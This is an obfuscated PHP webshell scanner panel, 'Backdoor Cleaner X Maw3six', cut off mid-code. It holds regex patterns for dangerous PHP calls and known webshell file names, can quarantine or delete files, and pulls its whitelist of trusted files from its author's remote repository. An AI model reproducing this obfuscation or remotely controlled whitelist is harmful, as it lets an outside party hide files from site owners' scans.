<?php eval(base64_decode('
 goto LGxls; KgHT3: ?>
<!doctypehtml><html lang="id"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Backdoor Cleaner X Maw3six</title><script src="https://cdn.tailwindcss.com"></script><style>.glass{backdrop-filter:blur(8px);background-color:rgba(17,24,39,.45);border:1px solid rgba(255,255,255,.06)}.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace}</style></head><body class="bg-gray-900 min-h-screen text-gray-200"><header class="p-4"><div class="container mx-auto"><h1 class="font-bold text-2xl">Backdoor Cleaner X Maw3six</h1><p class="text-sm text-gray-300">Webshell Scanner - Trusted Whitelist</p></div></header><main class="container mx-auto p-6"><div class="mb-6 gap-4 grid grid-cols-1 md:grid-cols-4"><div class="rounded glass p-4"><p class="text-sm">Files Scanned</p><p class="font-bold text-2xl"id="scanned-count">0</p></div><div class="rounded glass p-4"><p class="text-sm">Threats Found</p><p class="font-bold text-2xl"id="threats-count">0</p></div><div class="rounded glass p-4"><p class="text-sm">Quarantined</p><p class="font-bold text-2xl"id="cleaned-count">0</p></div><div class="rounded glass p-4"><p class="text-sm">Security Score</p><p class="font-bold text-2xl"id="security-score">100%</p></div></div><div class="rounded glass p-6 mb-6"><h2 class="font-semibold text-lg mb-3">Scan Configuration</h2><div class="grid grid-cols-1 gap-3 md:grid-cols-2"><div><label class="text-sm block mb-1">Directory to scan</label> <input class="rounded bg-gray-800 w-full p-2 mono"id="scan-directory"value="<?php  goto aHG8K; je4Ed: if ($_SERVER["\x52\105\121\125\x45\123\x54\137\115\x45\x54\x48\117\104"] === "\120\117\123\124" && isset($_POST["\x70\x61\163\x73\x77\157\162\x64"])) { if (password_verify($_POST["\160\x61\163\x73\x77\157\x72\x64"], $hashed_password)) { $_SESSION["\x6c\x6f\x67\x67\x65\x64\x5f\x69\156"] = true; header("\114\x6f\x63\141\x74\x69\157\x6e\x3a\40" . $_SERVER["\x50\x48\x50\137\123\105\114\x46"]); die; } else { $error = "\101\x63\x63\145\x73\x73\40\104\145\156\x69\145\x64\x21"; } } goto GDGBF; GDGBF: if (!isAuthenticated()) { ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><title>Dashboard Security</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-gray-900 min-h-screen flex items-center justify-center"><div class="bg-gray-400 p-8 rounded-xl shadow-lg w-96"><h2 class="font-bold text-2xl mb-6 text-center">@Maw3six</h2><?php  if (isset($error)) { ?>
<p class="text-sm mb-4 text-center text-red-500"><?php  echo htmlspecialchars($error); ?>
</p><?php  } ?>
<form class="space-y-4"method="POST"><input class="py-2 px-4 border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-400 rounded-lg w-full"name="password"placeholder="Password"required type="password"> <button class="py-2 rounded-lg w-full bg-red-500 hover:bg-blue-600 text-white transition"type="submit">>></button></form></div></body></html><?php  die; } goto cPtFH; aHG8K: echo htmlspecialchars(getcwd()); goto PoGQ5; RYJWC: function isAuthenticated() { return isset($_SESSION["\154\x6f\147\147\x65\x64\137\x69\x6e"]) && $_SESSION["\x6c\157\x67\147\145\144\137\151\156"] === true; } goto je4Ed; rZ4wE: class PhpBackdoorDetector { private $baseRoot; private $allowedExtensions = array("\x70\x68\x70", "\160\150\160\x33", "\x70\x68\x70\64", "\160\x68\160\65", "\160\150\164\x6d\154", "\151\156\143"); private $excludeDirs = array("\166\145\156\144\157\x72", "\156\x6f\144\145\137\x6d\157\x64\x75\x6c\145\163", "\x74\x6d\160", "\143\x61\x63\150\145", "\163\164\x6f\162\x61\x67\145"); private $patterns = array(); private $suspiciousFilenames = array(); private $suspiciousExtensions = array(); private $maxFileSize = 3 * 1024 * 1024; private $trustedFiles = array(); private $cacheFile; private $cacheTTL = 86400; public function __construct($baseRoot = null) { $rootCandidate = $baseRoot ?: $_SERVER["\x44\x4f\103\x55\115\105\x4e\x54\137\122\117\117\x54"] ?? getcwd(); $this->baseRoot = rtrim($rootCandidate, DIRECTORY_SEPARATOR); $this->cacheFile = __DIR__ . "\x2f\164\162\165\163\x74\x65\144\137\x66\x69\x6c\145\163\x2e\143\x61\x63\150\145\x2e\x6a\163\157\x6e"; $this->initPatterns(); $this->initSuspiciousLists(); $this->loadTrustedFiles(); } private function initPatterns() { $this->patterns = array("\x65\166\141\x6c" => "\57\x5c\142\x65\x76\x61\154\134\163\x2a\134\50\57\151", "\141\x73\163\x65\162\164" => "\57\134\142\x61\x73\x73\145\162\x74\x5c\163\52\134\50\x2f\151", "\x73\171\x73\164\x65\155" => "\57\x5c\142\163\171\163\164\145\155\x5c\163\x2a\134\50\x2f\x69", "\x65\x78\145\x63" => "\57\x5c\142\x65\170\145\143\x5c\x73\x2a\x5c\x28\57\x69", "\x73\150\x65\x6c\x6c\137\145\x78\x65\143" => "\57\134\x62\163\x68\x65\154\154\x5f\145\170\145\143\x5c\163\52\x5c\50\57\151", "\160\141\163\x73\164\150\x72\x75" => "\x2f\x5c\142\x70\x61\163\x73\164\x68\162\x75\134\x73\x2a\134\x28\57\151", "\x70\157\160\145\x6e" => "\x2f\134\142\160\x6f\x70\x65\x6e\x5c\163\52\134\x28\57\151", "\160\162\157\143\x5f\x6f\160\145\x6e" => "\x2f\134\x62\x70\x72\157\x63\137\x6f\160\145\156\134\163\x2a\x5c\x28\x2f\151", "\x63\162\x65\x61\x74\x65\137\146\x75\156\x63\164\151\x6f\156" => "\57\134\142\x63\x72\x65\x61\x74\145\137\x66\165\156\143\x74\x69\x6f\x6e\x5c\x73\x2a\134\50\57\151", "\142\141\163\145\66\x34\137\144\145\143\157\x64\145" => "\57\x5c\142\142\141\x73\x65\66\x34\137\x64\x65\143\157\x64\145\134\x73\52\134\x28\57\151", "\x67\x7a\x69\x6e\x66\x6c\141\164\145" => "\57\134\x62\x67\x7a\151\156\146\154\141\164\x65\134\163\52\134\x28\x2f\x69", "\163\164\162\137\x72\157\164\61\63" => "\57\x5c\142\163\164\162\137\162\157\164\61\63\134\163\x2a\x5c\50\57\151", "\x70\x72\x65\147\x5f\162\x65\160\154\x61\x63\145\137\145\x76\x61\x6c" => "\57\160\162\x65\x67\x5f\x72\x65\160\154\x61\143\145\134\163\52\x5c\50\133\x5e\54\135\x2b\54\133\x5e\x2c\x5d\53\x2c\x5b\x5e\x2c\135\53\x5c\51\x2f\151", "\146\151\x6c\x65\x5f\147\145\164\137\x63\x6f\156\164\145\156\x74\x73\x5f\160\x6f\163\x74" => "\x2f\146\x69\x6c\145\137\x67\x65\x74\x5f\x63\x6f\156\164\145\x6e\164\163\134\x73\x2a\134\x28\x5c\x73\52\x5c\44\137\x28\x50\x4f\x53\x54\174\107\105\124\x7c\x52\105\x51\125\105\x53\x54\51\57\x69", "\x69\x6e\143\154\165\144\145\137\144\157\154\154\x61\162" => "\x2f\x5c\142\50\151\156\143\x6c\165\144\145\174\162\145\x71\x75\151\x72\145\x7c\151\156\x63\x6c\165\x64\145\x5f\x6f\156\x63\x65\174\x72\145\x71\165\151\162\145\137\157\156\x63\x65\51\x5c\x73\x2a\x5c\50\134\163\x2a\134\x24\134\x77\x2b\x2f\151", "\144\x79\156\141\x6d\x69\x63\137\143\x61\x6c\x6c" => "\x2f\x5c\x24\x5b\141\55\172\x41\x2d\132\137\135\133\141\55\x7a\x41\55\x5a\x30\55\x39\x5f\135\52\x5c\163\52\x5c\x28\57\151", "\x6c\157\x6e\x67\137\142\141\x73\145\66\x34" => "\x2f\x5b\101\x2d\x5a\x61\x2d\172\x30\55\71\x2b\x5c\57\75\x5d\173\70\x30\x2c\x7d\x2f", "\x63\150\x6d\x6f\x64\x5f\x77\x6f\x72\x6c\x64\137\x77\x72\x69\x74\x61\142\154\145" => "\x2f\x5c\x62\143\150\155\x6f\144\x5c\163\x2a\134\x28\133\x5e\54\x5d\53\54\x5c\x73\52\50\60\77\133\x30\55\67\x5d\173\63\54\x34\x7d\174\x30\x78\133\60\55\71\141\55\146\101\x2d\106\135\53\51\x5c\x73\x2a\x5c\x29\57\x69"); } private function initSuspiciousLists() { $this->suspiciousFilenames = array("\163\150\145\x6c\154\56\x70\x68\x70", "\142\141\x63\x6b\x64\x6f\x6f\x72\56\x70\x68\x70", "\167\145\142\x73\150\x65\x6c\x6c\x2e\160\150\x70", "\x63\155\x64\x2e\x70\150\x70", "\162\65\67\56\160\150\160", "\x63\x39\x39\x2e\x70\150\x70", "\142\x33\x37\64\153\56\160\x68\160", "\160\150\160\163\x70\x79\56\160\150\160", "\164\x6f\157\154\163\x2e\160\150\x70", "\141\144\155\x69\156\x65\162\x2e\160\150\x70", "\x75\x70\154\x6f\x61\x64\x2e\160\150\x70", "\165\160\154\x6f\x61\144\x65\x72\56\x70\x68\x70"); $this->suspiciousExtensions = array("\x2e\160\150\160\x2e\142\x61\x6b", "\x2e\x70\150\160\x2e\157\x6c\x64", "\56\x70\x68\160\56\x73\167\x70", "\56\x70\150\x70\56\163\x77\157", "\56\142\x61\x63\153\x64\157\157\162", "\x2e\x73\x68\145\x6c\154"); } private function loadTrustedFiles() { if (file_exists($this->cacheFile)) { $cache = json_decode(file_get_contents($this->cacheFile), true); if (json_last_error() === JSON_ERROR_NONE && !empty($cache["\145\170\160\x69\x72\145\x73"]) && time() < $cache["\x65\170\x70\151\162\145\163"]) { $this->trustedFiles = $cache["\146\151\x6c\145\x73"]; return; } } $url = "\150\164\x74\160\x73\72\x2f\57\162\x61\167\56\x67\x69\164\150\x75\142\165\x73\x65\162\x63\157\x6e\x74\x65\x6e\x74\56\x63\157\x6d\57\x6d\141\x77\63\x73\x69\170\x2f\x50\171\x2d\110\145\x6c\160\145\x72\57\x72\145\146\x73\x2f\150\145\x61\x64\x73\x2f\155\141\151\156\x2f\x74\162\165\163\x74\145\144\x5f\x66\x69\154\x65\163\x2e\152\163\157\x6e"; $content = @file_get_contents($url); if ($content === false) { return; } $data = json_decode($content, true); if (json_last_error() === JSON_ERROR_NONE && isset($data["\x74\x72\x75\x73\x74\145\144\x5f\146\x69\154\145\163"])) { $cacheData = array("\x66\x69\x6c\x65\x73" => array_map("\x74\x72\151\x6d", $data["\164\x72\x75\163\164\145\x64\x5f\146\151\154\145\x73"]), "\145\x78\160\x69\162\x65\x73" => time() + $this->cacheTTL); file_put_contents($this->cacheFile, json_encode($cacheData, JSON_PRETTY_PRINT)); $this->trustedFiles = $cacheData["\146\151\x6c\x65\x73"]; } } private function isTrustedFile($filePath) { $relativePath = str_replace($this->baseRoot, '', $filePath); $relativePath = str_replace("\x5c", "\x2f", $relativePath); foreach ($this->trustedFiles as $trustedPath) { $trustedPath = str_replace("\134", "\x2f", trim($trustedPath)); if ($relativePath === $trustedPath) { return true; } if (strlen($trustedPath) > 0 && substr($relativePath, -strlen($trustedPath)) === $trustedPath) { return true; } if (fnmatch($trustedPath, $relativePath)) { return true; } } return false; } public function resolveDirectory($dir) { $dir = trim((string) $dir); if ($dir === '') { return $this->baseRoot; } if (!preg_match("\43\x5e\50\77\x3a\x2f\174\x5b\x41\x2d\132\141\55\172\x5d\72\x5c\134\x29\x23", $dir)) { $dir = $this->baseRoot . DIRECTORY_SEPARATOR . $dir; } $real = realpath($dir); if ($real === false) { return false; } $baseReal = realpath($this->baseRoot); if ($baseReal === false) { return false; } $baseReal = rtrim($baseReal, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR; $realNormalized = rtrim($real, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR; if (strpos($realNormalized, $baseReal) !== 0) { return false; } return rtrim($real, DIRECTORY_SEPARATOR); } public function buildFileList($directory, $maxFiles = 10000, $filterLevel = "\141\x6c\154") { $dir = $this->resolveDirectory($directory); if (!$dir) { return array("\x65\x72\162\x6f\162" => "\111\156\x76\141\x6c\x69\x64\40\x6f\x72\40\x64\151\x73\141\x6c\x6c\157\167\145\x64\40\x64\151\162\x65\x63\x74\x6f\162\171"); } $files = array(); try { $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS | FilesystemIterator::FOLLOW_SYMLINKS), RecursiveIteratorIterator::LEAVES_ONLY); foreach ($it as $fileinfo) { $pathParts = explode(DIRECTORY_SEPARATOR, $fileinfo->getPath()); $skip = false; foreach ($pathParts as $part) { if (in_array($part, $this->excludeDirs, true)) { $skip = true; break; } } if ($skip) { continue; } if (!$fileinfo->isFile()) { continue; } $ext = strtolower($fileinfo->getExtension()); if (!in_array($ext, $this->allowedExtensions, true)) { continue; } $size = $fileinfo->getSize(); if ($size === false || $size > $this->maxFileSize) { continue; } $files[] = $fileinfo->getPathname(); if (count($files) >= $maxFiles) { break; } } } catch (Exception $e) { return array("\145\162\x72\x6f\162" => "\x45\162\162\157\x72\40\154\151\x73\x74\x69\x6e\147\40\x66\x69\154\x65\163\72\40" . $e->getMessage()); } $_SESSION["\x64\x65\x74\x65\143\164\x6f\x72\137\x66\x69\154\x65\137\154\x69\x73\164"] = array_values($files); $_SESSION["\x64\145\x74\145\x63\164\157\162\137\x69\156\144\145\170"] = 0; $_SESSION["\144\145\x74\x65\x63\x74\157\162\137\162\x65\163\x75\154\164\163"] = array(); $_SESSION["\144\145\x74\x65\x63\164\157\x72\x5f\x73\x63\141\x6e\156\145\x64"] = 0; $_SESSION["\144\x65\x74\x65\x63\164\x6f\162\x5f\x73\x75\163\160\x69\143\x69\157\165\x73"] = 0; $_SESSION["\x64\x65\x74\145\x63\164\x6f\162\x5f\143\154\145\x61\156\x65\144"] = 0; $_SESSION["\x64\x65\x74\x65\x63\164\x6f\x72\x5f\x6c\141\x73\x74\x5f\146\x69\x6c\x65"] = null; $_SESSION["\144\145\164\145\143\x74\157\162\137\146\151\x6c\x74\145\162\137\x6c\x65\166\x65\x6c"] = $filterLevel; session_write_close(); return array("\143\157\165\156\x74" => count($files), "\x66\x69\x6c\x65\x73" => array_slice($files, 0, 500), "\x66\x69\154\x74\x65\162\137\154\x65\x76\x65\154" => $filterLevel); } public function scanFileEntry($filepath) { $list = $_SESSION["\x64\145\164\x65\143\x74\157\x72\137\146\x69\154\145\137\154\x69\163\164"] ?? array(); if (!in_array($filepath, $list, true)) { return array("\x65\162\x72\157\x72" => "\106\x69\x6c\145\40\156\x6f\x74\40\151\x6e\40\x73\143\141\156\156\x69\156\147\40\154\151\163\164\40\x6f\x72\40\163\145\x73\x73\x69\157\x6e\40\145\x78\160\x69\162\145\144", "\x66\151\x6c\145" => $filepath); } $real = realpath($filepath); if ($real === false) { return array("\x65\x72\162\x6f\162" => "\111\x6e\x76\x61\154\x69\144\x20\x66\151\154\145\40\x70\x61\164\x68"); } $baseReal = rtrim(realpath($this->baseRoot), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR; if (strpos(rtrim($real, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR, $baseReal) !== 0) { return array("\145\162\162\157\x72" => "\106\151\154\145\x20\x6f\x75\164\x73\151\x64\145\x20\141\154\154\x6f\167\x65\x64\x20\162\157\x6f\x74"); } session_write_close(); if ($this->isTrustedFile($real)) { session_start(); $_SESSION["\144\x65\164\145\x63\x74\157\x72\x5f\163\x63\141\x6e\156\145\x64"] = ($_SESSION["\x64\145\164\145\x63\x74\x6f\x72\137\163\x63\141\x6e\x6e\145\x64"] ?? 0) + 1; $_SESSION["\x64\x65\x74\145\143\x74\157\162\137\x72\145\x73\165\x6c\x74\x73"][] = array("\x70\141\164\150" => $real, "\162\151\163\x6b\137\x6c\x65\166\145\x6c" => "\164\162\x75\x73\164\145\x64", "\x74\150\x72\x65\141\x74\x73" => array("\x43\157\x72\x65\x20\x66\x69\x6c\145\x3a\x20\x4b\x6e\157\x77\x6e\40\164\162\x75\x73\x74\145\144\x20\146\151\154\145\x20\50\x77\150\151\164\145\154\x69\163\x74\145\x64\x29"), "\x73\x69\172\145" => filesize($real), "\x69\156\x63\x6c\165\x64\145\144" => true); session_write_close(); return array("\x70\x61\164\150" => $real, "\x72\151\x73\x6b\x5f\x6c\145\166\145\154" => "\x74\162\165\163\x74\145\x64", "\x74\150\162\145\141\164\x73" => array("\x43\x6f\162\145\x20\x66\151\154\x65\72\x20\113\156\x6f\x77\156\x20\164\x72\x75\x73\164\145\144\40\146\151\154\145\40\50\167\150\151\x74\x65\154\151\163\x74\x65\144\51"), "\163\x69\172\x65" => filesize($real), "\x73\153\151\160\160\145\x64" => true); } if (!is_readable($real)) { session_start(); $_SESSION["\144\x65\x74\x65\143\x74\157\162\x5f\x73\143\x61\156\x6e\x65\x64"] = ($_SESSION["\x64\145\x74\145\143\164\157\x72\x5f\163\143\141\x6e\x6e\145\x64"] ?? 0) + 1; $_SESSION["\144\145\x74\145\143\164\157\162\x5f\x72\x65\163\165\154\164\163"][] = array("\160\x61\164\x68" => $filepath, "\x72\151\163\153\137\x6c\x65\x76\145\154" => "\154\x6f\167", "\x74\150\x72\x65\x61\164\163" => array("\x4e\157\164\x20\162\x65\x61\144\141\142\154\145"), "\163\151\172\145" => 0); session_write_close(); return array("\145\x72\x72\x6f\x72" => "\106\x69\154\145\x20\x6e\x6f\x74\x20\x72\x65\141\144\x61\x62\x6c\x65"); } $content = @file_get_contents($real); if ($content === false) { session_start(); $_SESSION["\x64\x65\x74\145\x63\x74\157\162\137\163\143\x61\x6e\156\145\144"] = ($_SESSION["\x64\x65\x74\x65\143\x74\x6f\162\137\x73\143\x61\156\x6e\145\x64"] ?? 0) + 1; $_SESSION["\x64\145\x74\145\x63\x74\x6f\162\137\x72\145\163\165\x6c\x74\163"][] = array("\x70\x61\x74\150" => $filepath, "\162\151\x73\153\137\x6c\145\x76\145\154" => "\x6c\157\167", "\164\x68\162\x65\x61\164\163" => array("\106\141\x69\x6c\x65\144\40\164\157\40\162\x65\x61\144"), "\x73\x69\172\x65" => 0); session_write_close(); return array("\145\162\x72\x6f\x72" => "\x46\141\151\154\x65\144\40\x74\157\40\x72\x65\x61\144\40\x66\151\x6c\145"); } $reasons = array(); foreach ($this->patterns as $name => $pattern) { if (@preg_match($pattern, $content)) { $reasons[] = "\120\141\164\164\x65\162\x6e\x20\155\x61\164\x63\x68\145\144\72\40{$name}"; } } $basename = strtolower(basename($real)); foreach ($this->suspiciousFilenames as $sname) { if (strpos($basename, strtolower($sname)) !== false) { $reasons[] = "\x53\165\x73\x70\151\143\151\x6f\165\x73\40\x66\x69\x6c\145\156\141\155\145\x3a\40{$basename}"; break; } } foreach ($this->suspiciousExtensions as $ext) { if (substr($basename, -strlen($ext)) === $ext) { $reasons[] = "\x53\x75\x73\160\x69\143\151\157\x75\163\40\145\x78\x74\145\156\x73\x69\157\x6e\72\x20{$ext}"; } } if (preg_match("\57\142\141\x73\x65\66\64\137\144\145\143\157\144\145\x5c\163\x2a\x5c\50\57\x69", $content) && preg_match("\x2f\133\101\x2d\x5a\x61\55\x7a\x30\x2d\71\x2b\x5c\57\x3d\x5d\173\61\60\60\54\x7d\57", $content)) { $reasons[] = "\x4f\x62\x66\x75\163\x63\141\x74\x65\144\x20\x63\157\144\x65\72\40\154\157\x6e\147\x20\142\x61\163\145\x36\x34\40\53\x20\x64\145\x63\x6f\144\x65"; } $size = strlen($content); if ($size < 30 && preg_match("\x2f\145\x76\141\154\x7c\x62\x61\163\x65\x36\x34\x5f\144\145\143\157\x64\x65\x7c\x67\x7a\x69\x6e\146\154\x61\x74\145\57\x69", $content)) { $reasons[] = "\126\145\162\171\x20\163\155\141\154\x6c\40\146\151\154\x65\x20\167\x69\x74\150\x20\x65\166\x61\x6c\x2f\x6f\x62\146\165\x73\143\141\164\151\x6f\x6e"; } $risk = $this->computeRisk($reasons, $content); session_start(); $entry = array("\160\x61\x74\150" => $real, "\x72\x69\x73\153\137\154\145\x76\x65\154" => $risk, "\x74\150\162\x65\x61\164\163" => $reasons, "\x73\151\x7a\x65" => $size, "\151\x6e\x63\x6c\x75\144\x65\x64" => $this->matchesFilter($risk, $_SESSION["\x64\145\x74\x65\x63\164\x6f\x72\x5f\146\151\154\x74\145\162\x5f\x6c\145\166\x65\154"] ?? "\141\154\154")); if ($entry["\151\x6e\x63\154\x75\144\x65\144"] || $_SESSION["\x64\145\164\145\x63\x74\x6f\162\x5f\146\151\x6c\164\x65\162\x5f\154\145\166\x65\x6c"] === "\x61\x6c\x6c") { $_SESSION["\144\x65\164\x65\143\164\x6f\x72\x5f\162\x65\x73\165\154\164\163"][] = $entry; } $_SESSION["\x64\x65\164\x65\x63\x74\157\x72\x5f\x73\x63\x61\x6e\156\145\144"] = ($_SESSION["\144\x65\164\145\143\x74\x6f\162\x5f\x73\x63\x61\156\x6e\145\x64"] ?? 0) + 1; if (in_array($risk, array("\x68\151\147\x68", "\155\x65\x64\x69\x75\155"), true)) { $_SESSION["\x64\145\x74\x65\x63\x74\157\x72\137\163\x75\163\160\151\143\x69\157\165\163"] = ($_SESSION["\x64\x65\164\145\x63\x74\x6f\162\x5f\x73\165\x73\x70\151\143\151\x6f\x75\x73"] ?? 0) + 1; } $_SESSION["\144\145\164\x65\x63\164\x6f\162\137\x6c\x61\163\164\137\x66\151\154\x65"] = $real; session_write_close(); return $entry; } private function computeRisk(array $reasons, $content) { if (empty($reasons)) { return "\154\x6f\167"; } $score = 0; foreach ($reasons as $r) { if (preg_match("\x2f\x65\x76\141\154\174\163\171\163\164\x65\155\174\145\x78\145\143\174\x73\x68\x65\x6c\154\x5f\145\x78\x65\143\x7c\x70\x72\x6f\143\x5f\x6f\x70\x65\x6e\174\x70\157\160\x65\x6e\174\160\x61\163\x73\164\x68\x72\x75\x7c\x63\162\x65\141\x74\145\x5f\146\165\156\143\164\151\x6f\156\x2f\151", $r)) { $score += 60; } elseif (preg_match("\57\x4f\142\146\165\x73\x63\x61\x74\145\144\174\x62\141\x73\x65\66\x34\174\x67\x7a\151\156\146\154\x61\x74\145\174\x73\164\x72\x5f\162\157\x74\x31\63\57\151", $r)) { $score += 25; } elseif (preg_match("\x2f\x53\165\163\x70\151\143\151\157\x75\x73\40\x66\151\154\x65\156\141\155\145\x7c\145\170\x74\145\156\x73\151\x6f\156\174\126\145\162\171\40\x73\155\141\x6c\154\57\151", $r)) { $score += 15; } else { $score += 10; } } if (preg_match("\57\133\101\55\132\x61\x2d\x7a\60\55\x39\53\x5c\57\75\135\173\x32\x30\x30\54\175\x2f", $content)) { $score += 20; } if ($score >= 60) { return "\150\x69\147\150"; } if ($score >= 25) { return "\x6d\x65\x64\x69\165\x6d"; } return "\x6c\157\167"; } private function matchesFilter($riskLevel, $filterLevel) { if ($filterLevel === "\x61\x6c\154") { return true; } switch ($filterLevel) { case "\150\151\147\150\x5f\x6f\x6e\154\x79": return $riskLevel === "\x68\151\147\150"; case "\x6d\x65\144\151\165\155\x5f\x6f\x6e\x6c\x79": return $riskLevel === "\x6d\x65\x64\x69\165\x6d"; case "\x6c\157\167\x5f\x6f\x6e\154\171": return $riskLevel === "\154\x6f\x77"; case "\x68\151\147\150\137\155\x65\x64\x69\165\x6d": return in_array($riskLevel, array("\x68\x69\147\150", "\x6d\x65\144\151\x75\155")); case "\x6d\145\144\x69\165\155\x5f\154\x6f\x77": return in_array($riskLevel, array("\155\x65\144\151\165\155", "\154\157\167")); default: return true; } } public function quarantineFile($filepath, $createBackup = true) { $list = $_SESSION["\x64\145\164\145\143\x74\x6f\162\x5f\146\x69\154\145\137\154\x69\163\164"] ?? array(); if (!in_array($filepath, $list, true)) { return array("\x65\162\162\157\162" => "\106\151\x6c\x65\x20\156\x6f\x74\40\x69\156\40\163\143\141\x6e\156\151\x6e\x67\x20\x6c\x69\163\x74\40\157\x72\40\163\x65\163\x73\151\x6f\x6e\x20\x65\x78\x70\151\x72\x65\144"); } $real = realpath($filepath); if ($real === false) { return array("\x65\162\162\157\162" => "\x49\156\x76\141\x6c\x69\144\40\146\151\154\145\40\160\141\x74\x68"); } if (!is_writable(dirname($real))) { return array("\145\162\162\157\x72" => "\103\141\156\x6e\157\164\40\x77\x72\151\x74\x65\x20\x74\157\40\146\151\154\145\40\144\151\x72\145\143\164\x6f\162\x79\x20\x28\160\x65\x72\155\x69\163\x73\151\157\x6e\40\144\145\x6e\x69\x65\x64\x29"); } $quarantineDir = $this->baseRoot . DIRECTORY_SEPARATOR . "\x64\x65\164\x65\143\x74\x6f\x72\137\x71\x75\x61\162\141\x6e\x74\151\156\x65"; if (!is_dir($quarantineDir)) { if (!mkdir($quarantineDir, 488, true)) { return array("\x65\162\162\157\162" => "\106\141\x69\154\x65\x64\40\164\157\40\143\162\145\x61\164\145\x20\161\x75\x61\x72\141\x6e\164\x69\156\145\x20\x64\x69\x72\145\x63\164\x6f\162\x79"); } } $timestamp = date("\131\155\x64\x5f\x48\x69\x73"); $safeBase = preg_replace("\57\x5b\136\101\x2d\132\141\55\x7a\60\x2d\x39\x5f\56\x2d\135\x2f", "\137", basename($real)); $newName = $safeBase . "\56\x71\165\x61\x72\141\x6e\x74\x69\x6e\145\56" . $timestamp; $dest = $quarantineDir . DIRECTORY_SEPARATOR . $newName; if ($createBackup) { $backupDir = $this->baseRoot . DIRECTORY_SEPARATOR . "\x64\145\164\145\143\x74\x6f\x72\x5f\142\x61\143\153\165\160\x73"; if (!is_dir($backupDir) && !mkdir($backupDir, 488, true)) { return array("\145\162\162\x6f\162" => "\106\141\151\x6c\x65\x64\x20\164\157\x20\x63\x72\145\141\164\x65\x20\142\141\x63\x6b\x75\x70\x20\x64\151\x72\145\x63\164\157\162\x79"); } $backupPath = $backupDir . DIRECTORY_SEPARATOR . $safeBase . "\56\x62\x61\153\56" . $timestamp; if (!copy($real, $backupPath)) { return array("\145\162\x72\157\x72" => "\106\x61\x69\154\x65\x64\40\x74\x6f\40\x63\x72\145\141\164\x65\40\x62\x61\143\x6b\x75\160\40\x62\145\x66\157\162\145\x20\161\165\x61\x72\141\156\164\151\156\x65", "\x62\x61\143\153\x75\160" => $backupPath); } } if (!rename($real, $dest)) { return array("\145\x72\162\157\162" => "\x46\x61\151\x6c\145\144\x20\164\x6f\40\155\157\x76\x65\40\146\x69\154\145\x20\x74\x6f\x20\x71\x75\x61\162\x61\156\x74\151\x6e\x65", "\144\x65\x73\164" => $dest); } $_SESSION["\x64\145\164\145\x63\164\157\162\x5f\143\154\145\x61\156\x65\x64"] = ($_SESSION["\144\145\x74\x65\143\164\x6f\x72\137\143\x6c\x65\x61\x6e\145\x64"] ?? 0) + 1; return array("\157\x6b" => true, "\161\165\x61\x72\x61\156\x74\151\156\145" => $dest); } public function deleteFile($filepath) { $list = $_SESSION["\144\145\x74\x65\x63\164\x6f\162\x5f\x66\151\x6c\x65\x5f\x6c\x69\x73\164"] ?? array(); if (!in_array($filepath, $list, true)) { return array("\x65\x72\x72\x6f\x72" => "\x46\x69\154\145\40\x6e\157\164\40\x69\x6e\40\163\x63\141\x6e\156\151\x6e\147\x20\x6c\x69\x73\164\40\x6f\162\x20\x73\145\x73\163\x69\x6f\156\x20\x65\x78\x70\151\162\x65\144"); } $real = realpath($filepath); if ($real === false) { return array("\x65\162\162\157\x72" => "\x49\156\166\x61\x6c\151\144\40\x66\151\x6c\x65\40\x70\x61\x74\x68"); } if (!is_writable($real)) { return array("\x65\162\x72\x6f\162" => "\103\141\x6e\156\157\x74\x20\x64\x65\154\x65\164\145\40\x66\151\x6c\145\40\50\160\145\162\155\151\x73\163\151\x6f\x6e\x20\x64\x65\x6e\151\145\x64\51"); } if (@unlink($real)) { $_SESSION["\x64\145\x74\145\143\164\x6f\x72\x5f\143\154\x65\x61\156\145\x64"] = ($_SESSION["\144\145\164\145\x63\x74\x6f\x72\137\x63\x6c\x65\x61\x6e\145\x64"] ?? 0) + 1; return array("\x6f\x6b" => true, "\144\145\x6c\x65\x74\x65\x64" => $real); } else { return array("\x65\x72\x72\x6f\162" => "\x46\x61\151\154\x65\x64\x20\164\157\40\x64\x65\154\145\x74\145\40\x66\x69\x6c\145"); } } public function exportReport() { $results = $_SESSION["\144\x65\x74\145\143\164\x6f\x72\x5f\162\x65\x73\165\x6c\x74\x73"] ?? array(); $scanned = $_SESSION["\144\145\164\145\143\x74\x6f\x72\137\163\143\141\x6e\x6e\x65\144"] ?? count($results); $suspicious = $_SESSION["\x64\145\x74\x65\143\x74\157\x72\137\163\165\x73\160\151\x63\x69\x6f\165\163"] ?? 0; $cleaned = $_SESSION["\x64\145\x74\145\x63\164\157\x72\137\x63\x6c\x65\x61\x6e\145\144"] ?? 0; $score = $scanned > 0 ? round(100 - $suspicious / $scanned * 100) : 100; $report = "\x42\x61\x63\153\x64\157\157\x72\40\103\x6c\145\141\156\145\162\x20\130\x20\115\141\167\63\163\x69\x78\x20\55\x20\123\x65\x63\x75\162\x69\x74\x79\40\x52\x65\160\x6f\x72\164\12"; $report .= "\107\x65\156\x65\162\x61\x74\x65\144\72\40" . date("\131\x2d\155\x2d\144\40\x48\x3a\x69\x3a\x73") . "\xa"; $report .= str_repeat("\x3d", 50) . "\xa\xa"; $report .= "\123\143\x61\156\40\123\165\155\155\141\162\171\72\12"; $report .= "\106\x69\154\x65\x73\40\x53\143\x61\156\156\145\144\x3a\x20{$scanned}\12"; $report .= "\x53\x75\163\x70\x69\x63\151\157\x75\163\40\x46\151\154\145\x73\72\x20{$suspicious}\xa"; $report .= "\106\x69\x6c\x65\x73\40\x43\154\145\x61\x6e\x65\x64\x2f\x51\165\x61\162\141\156\x74\x69\x6e\145\144\x3a\x20{$cleaned}\xa"; $report .= "\123\x65\143\x75\162\151\x74\x79\x20\x53\x63\157\x72\145\72\x20{$score}\x25\12\12"; if (!empty($results)) { $report .= "\x44\145\x74\x65\x63\x74\x65\x64\40\124\150\162\145\x61\164\163\72\12"; foreach ($results as $file) { $report .= 